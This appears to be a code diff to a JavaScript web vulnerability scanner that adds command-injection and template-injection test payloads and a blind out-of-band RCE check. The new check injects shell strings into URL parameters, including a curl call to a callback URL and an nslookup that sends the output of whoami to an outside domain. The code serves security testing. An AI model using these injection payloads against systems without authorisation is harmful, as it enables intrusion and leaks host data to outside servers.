@@ -1,16 +1,20 @@
 import axios from 'axios';
+import { oobService } from '../../services/oob.js';
 
 const RCE_PAYLOADS = [
   { payload: '; echo WEBFORT_RCE_TEST', marker: 'WEBFORT_RCE_TEST' },
   { payload: '| echo WEBFORT_RCE_TEST', marker: 'WEBFORT_RCE_TEST' },
   { payload: '`echo WEBFORT_RCE_TEST`', marker: 'WEBFORT_RCE_TEST' },
   { payload: '$(echo WEBFORT_RCE_TEST)', marker: 'WEBFORT_RCE_TEST' },
+  { payload: '; id', marker: 'uid=' },
+  { payload: '&& id', marker: 'uid=' },
 ];
 
 const SSTI_PAYLOADS = [
   { payload: '{{7*7}}', marker: '49' },
   { payload: '${7*7}', marker: '49' },
   { payload: '<%= 7*7 %>', marker: '49' },
+  { payload: '${{7*7}}', marker: '49' },
 ];
 
 export class RCEScanner {
@@ -24,6 +28,7 @@ export class RCEScanner {
   async scan() {
     for (const url of this.urls.slice(0, 10)) {
       await this.testUrlParams(url);
+      await this.testOOB(url);
     }
     for (const form of this.forms.slice(0, 5)) {
       await this.testFormInputs(form);
@@ -32,6 +37,43 @@ export class RCEScanner {
       await this.testSSTI(url);
     }
     return this.vulnerabilities;
+  }
+
+  async testOOB(url) {
+    try {
+      const parsed = new URL(url);
+      for (const [param] of parsed.searchParams.entries()) {
+        const { token, callbackUrl } = oobService.generateToken();
+        const oobPayloads = [
+          `; curl ${callbackUrl}`,
+          `| nslookup $(whoami).${token}.websecure.io`, // Simulation
+          `& curl ${callbackUrl}`
+        ];
+
+        for (const payload of oobPayloads) {
+          const testUrl = new URL(url);
+          testUrl.searchParams.set(param, payload);
+          try {
+            await axios.get(testUrl.href, { timeout: 5000, validateStatus: () => true });
+            
+            // Wait a bit for OOB interaction
+            await new Promise(r => setTimeout(r, 2000));
+
+            if (oobService.hasInteraction(token)) {
+              this.vulnerabilities.push({
+                type: 'RCE', severity: 'critical',
+                title: `Blind RCE via Out-of-Band Interaction: ${param}`,
+                description: `Parameter "${param}" is vulnerable to blind OS command injection. An out-of-band interaction was detected after injecting a callback command.`,
+                url, parameter: param, evidence: `OOB interaction detected at ${callbackUrl}`,
+                remediation: 'Sanitize all user inputs. Use secure alternatives to system shell execution.',
+                cvssScore: 10.0, cweId: 'CWE-78', owaspCategory: 'A03:2021 - Injection'
+              });
+              return;
+            }
+          } catch {}
+        }
+      }
+    } catch {}
   }
 
   async testUrlParams(url) {
